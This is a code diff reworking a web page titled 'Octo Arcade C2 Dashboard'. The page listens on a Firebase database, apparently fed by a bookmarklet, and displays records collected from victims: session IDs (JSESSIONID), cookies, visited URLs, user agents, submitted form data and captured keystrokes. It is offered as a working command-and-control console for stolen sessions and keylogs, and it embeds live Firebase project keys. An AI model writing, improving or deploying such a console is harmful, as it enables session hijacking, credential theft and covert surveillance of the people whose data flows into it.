@@ -3,333 +3,393 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Dashboard - Octo Arcade</title>
+    <title>Octo Arcade C2 Dashboard</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        indigo: {
+                            600: '#4f46e5',
+                            700: '#4338ca',
+                        },
+                        slate: {
+                            850: '#18212f',
+                            900: '#0f172a',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --primary: #4f46e5;
-            --primary-dark: #4338ca;
-            --bg: #f3f4f6;
-            --surface: #ffffff;
-            --text: #1f2937;
-            --text-muted: #6b7280;
-            --border: #e5e7eb;
-            --success: #10b981;
-            --danger: #ef4444;
+        body { font-family: 'Inter', sans-serif; }
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
         }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: var(--bg); color: var(--text); min-height: 100vh; }
-
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        
-        header {
-            background: var(--surface);
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #1e293b;
         }
-
-        h1 { font-size: 1.5rem; color: var(--primary); display: flex; align-items: center; gap: 10px; }
-        h1 svg { width: 24px; height: 24px; }
-
-        .stats { display: flex; gap: 15px; }
-        .stat-box {
-            background: var(--bg);
-            padding: 10px 15px;
-            border-radius: 8px;
-            text-align: center;
-            min-width: 80px;
-        }
-        .stat-value { font-size: 1.25rem; font-weight: 700; color: var(--primary); }
-        .stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 20px;
-        }
-
-        .card {
-            background: var(--surface);
-            border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-        .card-header {
-            padding: 15px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #f9fafb;
-        }
-        .user-name { font-weight: 600; font-size: 1.1rem; color: var(--text); }
-        .badge {
-            background: var(--primary);
-            color: white;
-            padding: 4px 8px;
-            border-radius: 12px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-        .card-body { padding: 15px; flex: 1; }
-        .data-row { margin-bottom: 12px; }
-        .data-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; margin-bottom: 4px; font-weight: 600; }
-        .data-value {
-            background: var(--bg);
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 0.85rem;
-            word-break: break-all;
-            cursor: pointer;
-            border: 1px solid transparent;
-            transition: border-color 0.2s;
-        }
-        .data-value:hover { border-color: var(--primary); }
-        .data-value::after {
-            content: 'Click to Copy';
-            float: right;
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            opacity: 0;
-            transition: opacity 0.2s;
-        }
-        .data-value:hover::after { opacity: 1; }
-
-        .card-footer {
-            padding: 15px;
-            border-top: 1px solid var(--border);
-            display: flex;
-            gap: 10px;
-        }
-        .btn-action {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 0.9rem;
-        }
-        .btn-primary { background: var(--primary); color: white; }
-        .btn-primary:hover { background: var(--primary-dark); }
-        .btn-secondary { background: var(--bg); color: var(--text); border: 1px solid var(--border); }
-        .btn-secondary:hover { background: #e5e7eb; }
-
-        .empty-state {
-            grid-column: 1 / -1;
-            text-align: center;
-            padding: 50px;
-            color: var(--text-muted);
-            background: var(--surface);
-            border-radius: 12px;
-            border: 2px dashed var(--border);
-        }
-        .empty-state h2 { color: var(--text); margin-bottom: 10px; }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .modal.active { display: flex; }
-        .modal-content {
-            background: var(--surface);
-            width: 100%;
-            max-width: 600px;
-            max-height: 80vh;
-            border-radius: 12px;
-            display: flex;
-            flex-direction: column;
-        }
-        .modal-header {
-            padding: 20px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal-close { cursor: pointer; font-size: 1.5rem; color: var(--text-muted); }
-        .modal-body {
-            padding: 20px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 0.85rem;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--text);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            z-index: 2000;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .toast.show { opacity: 1; }
-
-        @media (max-width: 600px) {
-            .stats { width: 100%; justify-content: space-between; }
-            .stat-box { min-width: auto; flex: 1; }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #475569;
+            border-radius: 3px;
         }
     </style>
 </head>
-<body>
+<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col antialiased">
 
-<div class="container">
-    <header>
-        <h1>
-            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
-            Octo Arcade C2 Dashboard
-        </h1>
-        <div class="stats">
-            <div class="stat-box">
-                <div class="stat-value" id="statUsers">0</div>
-                <div class="stat-label">Profiles</div>
+    <!-- Header Navigation -->
+    <header class="bg-slate-850 border-b border-slate-800 sticky top-0 z-30 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex flex-col sm:flex-row justify-between items-center gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="bg-indigo-600 text-white p-2.5 rounded-xl shadow-lg shadow-indigo-600/30 flex items-center justify-center">
+                    <i class="fa-solid fa-terminal text-xl"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold tracking-tight text-white flex items-center gap-2">
+                        Octo Arcade C2 Dashboard
+                        <span class="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 animate-pulse">
+                            <span class="w-1.5 h-1.5 mr-1.5 bg-emerald-400 rounded-full"></span> Live Stream
+                        </span>
+                    </h1>
+                    <p class="text-xs text-slate-400">Real-time telemetry ingestion and monitoring console</p>
+                </div>
             </div>
-            <div class="stat-box">
-                <div class="stat-value" id="statLast">--:--</div>
-                <div class="stat-label">Last Sync</div>
+
+            <!-- Stats Bar -->
+            <div class="flex items-center gap-3 w-full sm:w-auto justify-end">
+                <div class="bg-slate-800/80 border border-slate-700/60 rounded-xl px-4 py-2 flex items-center space-x-3 shadow-sm">
+                    <div class="text-indigo-400"><i class="fa-solid fa-users"></i></div>
+                    <div>
+                        <div class="text-[10px] uppercase font-semibold tracking-wider text-slate-400">Profiles</div>
+                        <div id="stat-profiles" class="text-lg font-bold text-white">0</div>
+                    </div>
+                </div>
+                <div class="bg-slate-800/80 border border-slate-700/60 rounded-xl px-4 py-2 flex items-center space-x-3 shadow-sm">
+                    <div class="text-emerald-400"><i class="fa-solid fa-clock-rotate-left"></i></div>
+                    <div>
+                        <div class="text-[10px] uppercase font-semibold tracking-wider text-slate-400">Last Sync</div>
+                        <div id="stat-sync" class="text-sm font-semibold text-white">Never</div>
+                    </div>
+                </div>
             </div>
         </div>
     </header>
 
-    <div class="grid" id="userGrid">
-        <div class="empty-state" id="emptyState">
-            <h2>No Profiles Synced</h2>
-            <p>Waiting for data from the portal. Profiles will appear here automatically.</p>
+    <!-- Main Content Grid Container -->
+    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6">
+        
+        <!-- Empty State (Shown initially if 0 payloads) -->
+        <div id="empty-state" class="flex flex-col items-center justify-center py-20 text-center border-2 border-dashed border-slate-800 rounded-2xl bg-slate-850/40">
+            <div class="w-16 h-16 bg-slate-800 text-slate-400 rounded-full flex items-center justify-center text-2xl mb-4 shadow-inner">
+                <i class="fa-solid fa-satellite-dish animate-bounce"></i>
+            </div>
+            <h3 class="text-lg font-medium text-slate-200">Awaiting Ingestion Telemetry...</h3>
+            <p class="text-sm text-slate-400 max-w-sm mt-1">Listening for incoming payloads on Firebase Realtime Database root node <code class="bg-slate-800 text-indigo-300 px-1.5 py-0.5 rounded font-mono text-xs">/payloads</code>.</p>
+        </div>
+
+        <!-- Cards Grid -->
+        <div id="payloads-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <!-- Dynamically injected telemetry cards -->
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-slate-850 border-t border-slate-800 py-4 text-center text-xs text-slate-500">
+        Octo Arcade C2 Security & Telemetry Engine • Secure WebSocket Tunnel Active
+    </footer>
+
+    <!-- Raw JSON Modal -->
+    <div id="json-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm hidden">
+        <div class="bg-slate-850 border border-slate-700 rounded-2xl w-full max-w-2xl mx-4 overflow-hidden shadow-2xl flex flex-col max-h-[85vh]">
+            <div class="px-6 py-4 border-b border-slate-700/80 flex justify-between items-center bg-slate-800/50">
+                <h3 class="font-semibold text-white flex items-center gap-2">
+                    <i class="fa-solid fa-code text-indigo-400"></i> Raw Payload JSON
+                </h3>
+                <button onclick="closeModal()" class="text-slate-400 hover:text-white p-1.5 rounded-lg hover:bg-slate-700 transition">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+            <div class="p-6 overflow-y-auto custom-scrollbar flex-grow bg-slate-900/90">
+                <pre id="modal-json-content" class="text-xs font-mono text-indigo-300 whitespace-pre-wrap break-all"></pre>
+            </div>
+            <div class="px-6 py-3 border-t border-slate-700/80 bg-slate-800/50 flex justify-end gap-3">
+                <button onclick="copyModalContent()" class="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-medium transition shadow-lg shadow-indigo-600/20 flex items-center gap-2">
+                    <i class="fa-regular fa-copy"></i> Copy JSON
+                </button>
+                <button onclick="closeModal()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-slate-200 rounded-xl text-xs font-medium transition">
+                    Close
+                </button>
+            </div>
         </div>
     </div>
-</div>
 
-<div class="modal" id="detailsModal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h2 id="modalTitle">Profile Details</h2>
-            <span class="modal-close" onclick="closeModal()">&times;</span>
-        </div>
-        <div class="modal-body" id="modalContent"></div>
-    </div>
-</div>
+    <!-- Toast Notification System -->
+    <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
 
-<div class="toast" id="toast">Copied to clipboard!</div>
+    <!-- Firebase SDK v10 Modular CDN Imports & Dashboard Logic -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+        import { getDatabase, ref, onChildAdded } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-<script>
-    const API_URL = '/api/ingest';
-    let lastUpdated = 0;
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAuWzbauhK86FC-yc8RkcXftQAhdHexrpE",
+            authDomain: "bookmarklet-backend.firebaseapp.com",
+            databaseURL: "https://bookmarklet-backend-default-rtdb.firebaseio.com",
+            projectId: "bookmarklet-backend",
+            storageBucket: "bookmarklet-backend.firebasestorage.app",
+            messagingSenderId: "447001590035",
+            appId: "1:447001590035:ios:c13149711eac0631f702e6"
+        };
 
-    function showToast(message) {
-        const toast = document.getElementById('toast');
-        toast.textContent = message;
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 2000);
-    }
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-    function copyToClipboard(text) {
-        navigator.clipboard.writeText(text).then(() => {
-            showToast('Copied to clipboard!');
-        });
-    }
+        // State variables
+        let totalProfiles = 0;
+        let entryCount = 0;
+        const maxDomEntries = 50;
+        const payloadsGrid = document.getElementById('payloads-grid');
+        const emptyState = document.getElementById('empty-state');
+        const statProfiles = document.getElementById('stat-profiles');
+        const statSync = document.getElementById('stat-sync');
 
-    function closeModal() {
-        document.getElementById('detailsModal').classList.remove('active');
-    }
-
-    function openModal(title, content) {
-        document.getElementById('modalTitle').textContent = title;
-        document.getElementById('modalContent').textContent = content;
-        document.getElementById('detailsModal').classList.add('active');
-    }
-
-    function renderCard(user) {
-        const card = document.createElement('div');
-        card.className = 'card';
-        
-        const jsSession = user.sessionId || user.ck?.match(/JSESSIONID=([^;]+)/)?.[1] || 'Not Found';
-        const fullJsonString = JSON.stringify(user, null, 2).replace(/`/g, '\\`');
-        
-        card.innerHTML = `
-            <div class="card-header">
-                <span class="user-name">${user.name || 'Unknown'}</span>
-                <span class="badge">${user.type || 'initial'}</span>
-            </div>
-            <div class="card-body">
-                <div class="data-row">
-                    <div class="data-label">JSESSIONID</div>
-                    <div class="data-value" onclick="copyToClipboard(this.textContent)" title="Click to Copy">${jsSession}</div>
-                </div>
-                <div class="data-row">
-                    <div class="data-label">URL</div>
-                    <div class="data-value" onclick="copyToClipboard(this.textContent)" title="Click to Copy">${user.url || 'N/A'}</div>
-                </div>
-                <div class="data-row">
-                    <div class="data-label">User Agent</div>
-                    <div class="data-value" onclick="copyToClipboard(this.textContent)" title="Click to Copy">${user.ua || 'N/A'}</div>
-                </div>
-                ${user.type === 'form' && user.data ? `
-                <div class="data-row">
-                    <div class="data-label">Form Data</div>
-                    <div class="data-value" onclick="copyToClipboard(this.textContent)" title="Click to Copy">${JSON.stringify(user.data, null, 2)}</div>
-                </div>` : ''}
-                ${user.type === 'keys' && user.data ? `
-                <div class="data-row">
-                    <div class="data-label">Key Log</div>
-                    <div class="data-value" onclick="copyToClipboard(this.textContent)" title="Click to Copy">${user.data.map(k => k.k).join('')}</div>
-                </div>` : ''}
-            </div>
-            <div class="card-footer">
-                <button class="btn-action btn-secondary" onclick="openModal('Full JSON', \`${fullJsonString}\`)">View JSON</button>
-            </div>
-        `;
-        return card;
-    }
-
-    // Example function to fetch and update dashboard state if an endpoint exists
-    async function fetchDashboardData() {
-        try {
-            const response = await fetch(API_URL);
-            if (!response.ok) return;
-            const data = await response.json();
-            
-            const grid = document.getElementById('userGrid');
-            const emptyState = document.getElementById('emptyState');
-            
-            if (Array.isArray(data) && data.length > 0) {
-                if (emptyState) emptyState.remove();
-                grid.innerHTML = '';
-                data.forEach(user => grid.appendChild(renderCard(user)));
-                
-                document.getElementById('statUsers').textContent = data.length;
-                const now = new Date();
-                document.getElementById('statLast').textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            }
-        } catch (e) {
-            // Endpoint might not be active or reachable yet
+        // XSS Sanitization helper
+        function escapeHtml(str) {
+            if (typeof str !== 'string') str = String(str || '');
+            return str
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
         }
-    }
 
-    // Optional polling interval
-    // setInterval(fetchDashboardData, 5000);
-</script>
+        // Badge color mapping based on payload type
+        function getTypeBadgeColor(type) {
+            const t = (type || 'default').toLowerCase();
+            if (t.includes('form')) return 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30';
+            if (t.includes('key')) return 'bg-amber-500/10 text-amber-400 border-amber-500/30';
+            if (t.includes('session') || t.includes('bypass')) return 'bg-purple-500/10 text-purple-400 border-purple-500/30';
+            if (t.includes('initial')) return 'bg-sky-500/10 text-sky-400 border-sky-500/30';
+            return 'bg-indigo-500/10 text-indigo-400 border-indigo-500/30';
+        }
+
+        // Global Toast Notification function
+        window.showToast = function(message) {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = 'pointer-events-auto bg-slate-800 text-slate-100 border border-slate-700 px-4 py-3 rounded-xl shadow-xl flex items-center space-x-3 transform translate-y-2 opacity-0 transition-all duration-300 text-xs font-medium';
+            toast.innerHTML = `<span class="text-emerald-400"><i class="fa-solid fa-circle-check"></i></span><span>${escapeHtml(message)}</span>`;
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.classList.remove('translate-y-2', 'opacity-0');
+            }, 10);
+
+            setTimeout(() => {
+                toast.classList.add('translate-y-2', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // Copy text helper with fallback
+        window.copyToClipboard = function(text, label = 'Value') {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast(`${label} copied to clipboard`);
+                }).catch(() => {
+                    fallbackCopy(text, label);
+                });
+            } else {
+                fallbackCopy(text, label);
+            }
+        }
+
+        function fallbackCopy(text, label) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                showToast(`${label} copied to clipboard`);
+            } catch (err) {
+                showToast(`Failed to copy`);
+            }
+            document.body.removeChild(textArea);
+        }
+
+        // Modal triggers
+        window.openModal = function(encodedJson) {
+            try {
+                const dataObj = JSON.parse(decodeURIComponent(encodedJson));
+                document.getElementById('modal-json-content').textContent = JSON.stringify(dataObj, null, 2);
+                document.getElementById('json-modal').classList.remove('hidden');
+            } catch (e) {
+                document.getElementById('modal-json-content').textContent = "Error parsing raw JSON payload.";
+                document.getElementById('json-modal').classList.remove('hidden');
+            }
+        }
+
+        window.closeModal = function() {
+            document.getElementById('json-modal').classList.add('hidden');
+        }
+
+        window.copyModalContent = function() {
+            const content = document.getElementById('modal-json-content').textContent;
+            copyToClipboard(content, 'Raw JSON');
+        }
+
+        // Listen to Firebase Realtime Database child_added on /payloads
+        const payloadsRef = ref(db, 'payloads');
+
+        onChildAdded(payloadsRef, (snapshot) => {
+            const val = snapshot.val();
+            if (!val) return;
+
+            // Increment profile/total stats
+            totalProfiles++;
+            entryCount++;
+            statProfiles.textContent = totalProfiles;
+
+            // Update last sync time
+            const now = new Date();
+            const timeString = now.toLocaleTimeString() + '.' + String(now.getMilliseconds()).padStart(3, '0');
+            statSync.textContent = timeString;
+
+            // Hide empty state if first item
+            if (emptyState && !emptyState.classList.contains('hidden')) {
+                emptyState.classList.add('hidden');
+            }
+
+            // Extract fields safely
+            const name = escapeHtml(val.name || 'Anonymous User');
+            const type = escapeHtml(val.type || 'telemetry');
+            const url = escapeHtml(val.url || 'N/A');
+            const ua = escapeHtml(val.ua || 'Unknown Agent');
+            const sessionId = escapeHtml(val.sessionId || 'N/A');
+            const ck = escapeHtml(val.ck || 'None');
+            const timestamp = escapeHtml(val.ts || now.toISOString());
+            const rawData = val.data || null;
+
+            // Format conditional content based on type
+            let conditionalHtml = '';
+            if (type.toLowerCase() === 'form' && rawData) {
+                const formattedJson = typeof rawData === 'object' ? JSON.stringify(rawData, null, 2) : String(rawData);
+                conditionalHtml = `
+                    <div class="mt-3 pt-3 border-t border-slate-700/60">
+                        <div class="text-[10px] uppercase font-semibold text-slate-400 mb-1 flex items-center justify-between">
+                            <span>Form Data Payload</span>
+                            <button onclick="copyToClipboard('${escapeHtml(JSON.stringify(rawData))}', 'Form Data')" class="text-indigo-400 hover:text-indigo-300 text-[10px]"><i class="fa-regular fa-copy"></i> Copy</button>
+                        </div>
+                        <pre class="bg-slate-900/80 p-2.5 rounded-lg text-xs font-mono text-emerald-300 overflow-x-auto max-h-32 custom-scrollbar">${escapeHtml(formattedJson)}</pre>
+                    </div>
+                `;
+            } else if (type.toLowerCase() === 'keys') {
+                let keysString = '';
+                if (Array.isArray(rawData)) {
+                    keysString = rawData.join(' ');
+                } else if (typeof rawData === 'object' && rawData !== null) {
+                    keysString = JSON.stringify(rawData);
+                } else {
+                    keysString = String(rawData || '');
+                }
+                conditionalHtml = `
+                    <div class="mt-3 pt-3 border-t border-slate-700/60">
+                        <div class="text-[10px] uppercase font-semibold text-slate-400 mb-1 flex items-center justify-between">
+                            <span>Captured Keystrokes</span>
+                            <button onclick="copyToClipboard('${escapeHtml(keysString)}', 'Keys')" class="text-indigo-400 hover:text-indigo-300 text-[10px]"><i class="fa-regular fa-copy"></i> Copy</button>
+                        </div>
+                        <div class="bg-slate-900/80 p-2.5 rounded-lg text-xs font-mono text-amber-300 break-words max-h-32 overflow-y-auto custom-scrollbar">${escapeHtml(keysString)}</div>
+                    </div>
+                `;
+            } else if (rawData) {
+                // Generic dynamic payload
+                const formattedJson = typeof rawData === 'object' ? JSON.stringify(rawData, null, 2) : String(rawData);
+                conditionalHtml = `
+                    <div class="mt-3 pt-3 border-t border-slate-700/60">
+                        <div class="text-[10px] uppercase font-semibold text-slate-400 mb-1">Dynamic Payload Data</div>
+                        <pre class="bg-slate-900/80 p-2.5 rounded-lg text-xs font-mono text-slate-300 overflow-x-auto max-h-28 custom-scrollbar">${escapeHtml(formattedJson)}</pre>
+                    </div>
+                `;
+            }
+
+            // Full JSON string for modal
+            const safeFullJson = encodeURIComponent(JSON.stringify(val));
+            const badgeClass = getTypeBadgeColor(type);
+
+            // Create Card Element
+            const card = document.createElement('div');
+            card.className = 'bg-slate-850 border border-slate-700/80 rounded-2xl shadow-xl hover:border-slate-600 transition flex flex-col justify-between overflow-hidden group';
+            card.innerHTML = `
+                <div class="p-5 flex-grow">
+                    <!-- Card Header -->
+                    <div class="flex items-start justify-between gap-3 mb-4">
+                        <div>
+                            <h3 class="font-bold text-white text-base tracking-tight flex items-center gap-2">
+                                <i class="fa-solid fa-user-secret text-indigo-400 text-sm"></i> ${name}
+                            </h3>
+                            <span class="text-[11px] text-slate-400 font-mono">${timestamp}</span>
+                        </div>
+                        <span class="px-2.5 py-1 rounded-full text-[11px] font-semibold border uppercase tracking-wider ${badgeClass}">
+                            ${type}
+                        </span>
+                    </div>
+
+                    <!-- Card Body Key-Values -->
+                    <div class="space-y-2.5 text-xs">
+                        <div>
+                            <span class="text-slate-400 block text-[10px] uppercase font-semibold">Session ID</span>
+                            <code onclick="copyToClipboard('${sessionId}', 'Session ID')" title="Click to copy" class="mt-0.5 block bg-slate-900/90 text-indigo-300 px-2.5 py-1.5 rounded-lg font-mono border border-slate-800 cursor-pointer hover:bg-slate-900 hover:border-indigo-500/50 transition truncate">
+                                <i class="fa-regular fa-copy mr-1 text-slate-500"></i> ${sessionId}
+                            </code>
+                        </div>
+                        <div>
+                            <span class="text-slate-400 block text-[10px] uppercase font-semibold">Target URL</span>
+                            <code onclick="copyToClipboard('${url}', 'URL')" title="Click to copy" class="mt-0.5 block bg-slate-900/90 text-sky-300 px-2.5 py-1.5 rounded-lg font-mono border border-slate-800 cursor-pointer hover:bg-slate-900 hover:border-sky-500/50 transition truncate">
+                                <i class="fa-regular fa-copy mr-1 text-slate-500"></i> ${url}
+                            </code>
+                        </div>
+                        <div>
+                            <span class="text-slate-400 block text-[10px] uppercase font-semibold">User Agent</span>
+                            <code onclick="copyToClipboard('${ua}', 'User Agent')" title="Click to copy" class="mt-0.5 block bg-slate-900/90 text-slate-300 px-2.5 py-1.5 rounded-lg font-mono border border-slate-800 cursor-pointer hover:bg-slate-900 hover:border-slate-600 transition truncate">
+                                <i class="fa-regular fa-copy mr-1 text-slate-500"></i> ${ua}
+                            </code>
+                        </div>
+                    </div>
+
+                    ${conditionalHtml}
+                </div>
+
+                <!-- Card Footer -->
+                <div class="px-5 py-3 bg-slate-800/60 border-t border-slate-700/60 flex justify-end">
+                    <button onclick="openModal('${safeFullJson}')" class="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 rounded-xl text-xs font-semibold transition flex items-center justify-center gap-2 shadow-sm">
+                        <i class="fa-solid fa-code text-indigo-400"></i> View Full JSON
+                    </button>
+                </div>
+            `;
+
+            // Prepend new card to grid
+            payloadsGrid.insertBefore(card, payloadsGrid.firstChild);
+
+            // Performance Requirement: Limit DOM to the last 50 entries
+            if (payloadsGrid.children.length > maxDomEntries) {
+                payloadsGrid.removeChild(payloadsGrid.lastChild);
+            }
+        });
+    </script>
 </body>
 </html>
